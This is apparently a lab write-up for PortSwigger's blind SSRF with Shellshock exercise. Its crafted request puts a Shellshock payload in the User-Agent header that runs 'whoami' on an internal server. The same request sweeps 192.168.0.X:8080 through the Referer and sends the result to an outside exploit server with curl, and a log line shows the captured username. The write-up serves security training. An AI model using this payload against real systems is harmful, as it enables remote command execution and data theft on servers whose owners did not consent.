# Blind SSRF with Shellshock exploitation

[Lab in PortSwigger](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

## Definition
Simply identifying a blind SSRF vulnerability that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. Since you cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server. 

## Notes
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. 

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

**Shellshock**  
[Overview from OWASP](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)
[Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

**SSRF Ping Back Test**
```http
GET /someendpoint?param=foo HTTP/1.1
...
User-Agent: http://my-pingback-url.com
Referer: http://my-pingback-url.com
```

**Crafted Http Request**
```http
GET /product?productId=1 HTTP/1.1
Host: acb71f331fba00b7c0361fc9003e00dd.web-security-academy.net
Cookie: session=CXQanvV7Qzqks0eM86BBSohCpbL82FmH
User-Agent: () { :; }; /usr/bin/curl https://exploit-accf1fdb1f1d88d4c04385840163005c.web-security-academy.net/exploit?$(whoami)
Referer: http://192.168.0.ยงXยง:8080
```

**User Name**
```log
"GET /exploit?peter-EgNv7o HTTP/1.1" 200 "User-Agent: curl/7.68.0"
```

## Key Words
> bash, shellshock, blind ssrf